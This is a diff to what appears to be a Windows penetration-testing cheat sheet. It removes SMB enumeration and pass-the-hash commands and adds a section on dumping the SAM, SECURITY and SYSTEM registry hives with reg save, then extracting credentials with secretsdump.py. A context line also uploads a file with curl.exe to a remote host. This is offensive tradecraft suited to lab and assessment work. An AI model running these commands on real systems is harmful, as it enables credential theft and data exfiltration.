@@ -4,35 +4,9 @@ description: >-
   escalate privileges
 ---
 
-# Enumeration
+# Local Enumeration
 
-## SMB
-
-SMB (Server Message Block) is a protocol used mainly for sharing files on a local network. One server has multiple _shares_ that contain a filesystem with directories and files. List shares on a server using `smbclient -L` and then connect to any one of them to read/write files:
-
-<pre class="language-bash"><code class="lang-bash"><strong>smbclient -L //10.10.10.10 -U $USERNAME --password $PASSWORD
-</strong># Alternative using nxc:
-<strong>nxc smb 10.10.10.10 -u $USERNAME -p $PASSWORD --shares
-</strong></code></pre>
-
-Then when you have found a share, you can use commands like `ls` and `cd` to traverse the filesystem, and `get <FILENAME>` to download anything. If you have write permissions, the `put` command also lets you upload files.\
-To download all files recursively and look at them locally, use the following 4 commands:
-
-```shell-session
-$ mkdir smb && cd smb
-$ smbclient //10.10.10.10/share -U $USERNAME --password $PASSWORD
-> mask ""
-> recurse ON
-> prompt OFF
-> mget *
-```
-
-{% hint style="info" %}
-By passing `--pw-nt-hash` instead of `--password`, you can specify an NTLM hash for the user to perform pass-the-hash:
-
-<pre class="language-bash"><code class="lang-bash"><strong>smbclient //10.10.10.10/share -U $USERNAME --pw-nt-hash $NTLM_HASH
-</strong></code></pre>
-{% endhint %}
+For enumeration of network protocols like SMB, RPC, or LDAP, see [#enumeration](scanning-spraying.md#enumeration "mention").
 
 ## Users
 
@@ -321,6 +295,32 @@ curl.exe -X POST http://10.10.10.10:8000/upload -F 'files=@C:\Windows\win.ini'
 {% code title="List disks (C:\, D:\, etc.)" %}
 ```powershell
 wmic logicaldisk get deviceid,volumename,description
+```
+{% endcode %}
+
+#### Stealing SAM / SYSTEM files
+
+One interesting location to check is `C:\Windows\System32\config\`, where normally only administrators should be able to read contents. Permissions may be misconfigured or you may find the same files backed up in another readable place, but these should be interesting:
+
+* `SAM` - stores _local_ cached credentials, known as SAM secrets
+* `SECURITY` - stores _domain_ cached credentials, known as LSA secrets
+* `SYSTEM` - contains information to decrypt both SAM and LSA secrets above
+
+On a running system, you often cannot copy these files directly because they are in use. With backups, this is not the case, but on a running system you can use `reg`  to export them live:
+
+{% code title="Export from live system" %}
+```powershell
+reg save HKLM\SAM "C:\Windows\Temp\SAM"
+reg save HKLM\SECURITY "C:\Windows\Temp\SECURITY"
+reg save HKLM\SYSTEM "C:\Windows\Temp\SYSTEM"
+```
+{% endcode %}
+
+When these three files, either copied directly or exported, are copied to your local machine, it is time to extract credentials from them. Using [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) it is possible to parse the three files like so:
+
+{% code title="Extract credentials" overflow="wrap" %}
+```bash
+secretsdump.py -sam 'SAM' -security 'SECURITY' -system 'SYSTEM' LOCAL
 ```
 {% endcode %}
 
